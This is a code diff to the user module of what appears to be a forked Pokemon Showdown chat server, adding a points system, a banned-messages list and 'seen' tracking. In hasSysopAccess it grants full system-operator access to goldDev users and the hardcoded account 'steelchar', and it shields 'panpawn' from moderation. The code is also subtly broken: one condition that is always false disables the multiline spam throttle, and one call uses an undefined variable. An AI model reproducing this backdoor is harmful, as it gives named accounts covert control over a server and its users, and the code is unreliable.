@@ -28,7 +28,6 @@ const THROTTLE_BUFFER_LIMIT = 6;
 const THROTTLE_MULTILINE_WARN = 4;
 
 var fs = require('fs');
-var steno = require('steno');
 
 /* global Users: true */
 var Users = module.exports = getUser;
@@ -39,6 +38,16 @@ var User, Connection;
 var users = Users.users = Object.create(null);
 var prevUsers = Users.prevUsers = Object.create(null);
 var numUsers = 0;
+
+var ipbans = fs.createWriteStream("config/ipbans.txt", {flags: "a"}); // do not remove this line
+
+try {
+	exports.bannedMessages = fs.readFileSync('config/bannedmessages.txt','utf8');
+} catch(e) {
+	exports.bannedMessages = '';
+	fs.writeFileSync('config/bannedmessages.txt','','utf8');
+}
+exports.bannedMessages = exports.bannedMessages.split('\n');
 
 /**
  * Get a user.
@@ -357,7 +366,7 @@ Users.socketReceive = function (worker, workerid, socketid, message) {
 		return;
 	}
 	lines = lines.split('\n');
-	if (lines.length >= THROTTLE_MULTILINE_WARN) {
+	if (lines.length >= THROTTLE_MULTILINE_WARN && !user.group === '~') {
 		connection.popup("You're sending too many lines at once. Try using a paste service like [[Pastebin]].");
 		return;
 	}
@@ -492,14 +501,33 @@ User = (function () {
 		this.guestNum = numUsers;
 		this.name = 'Guest ' + numUsers;
 		this.named = false;
+		this.renamePending = false; 
 		this.registered = false;
 		this.userid = toId(this.name);
 		this.group = Config.groupsranking[0];
+		
+		//points system user variables
+		this.money = 0;
+		this.coins = 0;
+		this.canCustomSymbol = false;
+		this.canCustomAvatar = false;
+		this.canAnimatedAvatar = false;
+		this.canChatRoom = false;
+		this.canTrainerCard = false;
+		this.canFixItem = false;
+		this.canChooseTour = false;
+		this.canDecAdvertise = false;
+		this.hasCustomSymbol = false;
+
+		this.isAway = false;
+		this.originalName = '';
 
 		var trainersprites = [1, 2, 101, 102, 169, 170, 265, 266];
 		this.avatar = trainersprites[Math.floor(Math.random() * trainersprites.length)];
 
 		this.connected = true;
+		
+		this.goldDev = false;
 
 		if (connection.user) connection.user = this;
 		this.connections = [connection];
@@ -526,6 +554,8 @@ User = (function () {
 		users[this.userid] = this;
 	}
 
+	User.prototype.staffAccess = false;
+	User.prototype.goldDev = false;
 	User.prototype.isSysop = false;
 
 	// for the anti-spamming mechanism
@@ -574,18 +604,14 @@ User = (function () {
 				if (room.isPrivate === true) return ' ' + this.name;
 			}
 		}
-		if (this.hiding) {
-			return ' ' + this.name;
-		}
-		if (this.customSymbol) {
-			return this.customSymbol + this.name;
-		}
 		return this.group + this.name;
 	};
 	User.prototype.isStaff = false;
 	User.prototype.can = function (permission, target, room) {
 		if (this.hasSysopAccess()) return true;
-
+		if (target) {
+			if (target.goldDev || target.userid == 'panpawn') return false;
+		}
 		var group = this.group;
 		var targetGroup = '';
 		if (target) targetGroup = target.group;
@@ -640,7 +666,7 @@ User = (function () {
 	 * Special permission check for system operators
 	 */
 	User.prototype.hasSysopAccess = function () {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || this.goldDev || this.userid == 'steelchar') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -716,6 +742,7 @@ User = (function () {
 		this.group = Config.groupsranking[0];
 		this.isStaff = false;
 		this.isSysop = false;
+		this.goldDev = false;
 
 		for (var i = 0; i < this.connections.length; i++) {
 			// console.log('' + name + ' renaming: connection ' + i + ' of ' + this.connections.length);
@@ -813,7 +840,6 @@ User = (function () {
 			this.send('|nametaken|' + name + "|Your authentication token was invalid.");
 		}
 
-		if (Tells.inbox[userid]) Tells.sendTell(userid, this);
 		return false;
 	};
 	User.prototype.validateRename = function (name, tokenData, newlyRegistered, challenge) {
@@ -942,6 +968,9 @@ User = (function () {
 		return false;
 	};
 	User.prototype.forceRename = function (name, registered) {
+		try {
+			updateSeen(name);
+		} catch (e) {}
 		// skip the login server
 		var userid = toId(name);
 
@@ -1196,14 +1225,6 @@ User = (function () {
 		}
 	};
 	User.prototype.onDisconnect = function (connection) {
-		var name = 'Guest ' + this.guestNum;
-		var userid = toId(name);
-		if (this.registered && this.userid !== userid) {
-			Seen[this.userid] = Date.now();
-			steno.writeFile('config/seen.json', JSON.stringify(Seen, null, 2), function (err) {
-				if (err) throw err;
-			});
-		}
 		for (var i = 0; i < this.connections.length; i++) {
 			if (this.connections[i] === connection) {
 				// console.log('DISCONNECT: ' + this.userid);
@@ -1414,6 +1435,10 @@ User = (function () {
 		room = Rooms.get(room);
 		if (room.id === 'global' && !force) {
 			// you can't leave the global room except while disconnecting
+			try {
+				updateSeen(name);
+			} catch (e) {}
+
 			return false;
 		}
 		for (var i = 0; i < this.connections.length; i++) {
